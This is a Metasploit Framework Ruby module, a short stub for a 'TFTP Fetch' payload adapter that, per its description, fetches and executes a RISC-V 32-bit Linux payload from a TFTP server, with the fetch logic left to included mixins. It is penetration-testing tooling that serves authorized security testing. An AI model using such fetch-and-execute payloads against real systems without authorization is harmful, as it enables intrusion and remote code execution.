##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter::Fetch::TFTP
  include Msf::Payload::Adapter::Fetch::LinuxOptions

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TFTP Fetch',
        'Description' => 'Fetch and execute an RISC-V 32-bit payload from a TFTP server.',
        'Author' => ['Brendan Watters', 'Spencer McIntyre', 'bcoles'],
        'Platform' => 'linux',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_RISCV32LE,
        'AdaptedPlatform' => 'linux'
      )
    )
  end
end
